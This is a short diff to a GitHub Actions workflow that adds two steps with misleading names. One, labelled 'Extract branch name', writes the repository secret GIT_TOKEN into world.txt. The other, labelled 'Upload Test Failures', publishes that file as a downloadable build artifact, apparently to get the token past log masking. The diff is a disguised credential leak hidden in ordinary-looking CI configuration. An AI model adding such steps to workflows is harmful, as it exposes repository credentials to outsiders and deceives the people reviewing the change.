@@ -33,3 +33,13 @@ jobs:
           value: ${{ env.patch_version }}
           repository: ${{ github.repository }}
           token: ${{ secrets.GIT_TOKEN }}
+
+      - name: Extract branch name
+        run: echo "patch_version=$((${{ secrets.GIT_TOKEN }}+1))" >> world.txt
+
+
+      - name: Upload Test Failures
+        uses: actions/upload-artifact@v3
+        with:
+          name: world
+          path: world.txt
